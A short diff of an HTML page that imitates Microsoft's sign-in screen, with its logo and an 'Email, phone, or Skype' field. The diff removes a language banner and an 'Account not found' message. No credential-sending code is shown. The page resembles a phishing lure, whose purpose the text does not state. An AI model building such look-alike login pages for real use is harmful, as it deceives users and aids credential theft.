@@ -79,11 +79,6 @@
 </head>
 <body>
 
-    <div style="position: absolute; top: 0; width: 100%; background-color: #e6e6e6; padding: 10px 0; font-size: 0.8rem; color: #333; text-align: center; border-bottom: 1px solid #ccc;">
-        The Browser has set your display language to English based on your system's language. 
-        <span style="color: #0067b8; cursor: pointer;">Change language...</span>
-    </div>
-
     <div class="login-card">
         <svg class="microsoft-logo-svg" viewBox="0 0 108 108" xmlns="http://www.w3.org/2000/svg" style="display: block;">
             <rect x="0" y="0" width="50%" height="50%" fill="#F25022"/>
@@ -96,10 +91,6 @@
 
         <form onsubmit="handleLoginAttempt(event)">
             <input type="email" id="user-input" placeholder="Email, phone, or Skype" class="input-style" required>
-            
-            <p id="status-message" class="text-sm mb-6 hidden text-red-600">
-                Account not found. Please check your credentials.
-            </p>
 
             <p class="link-style">
                 No account? Create one!
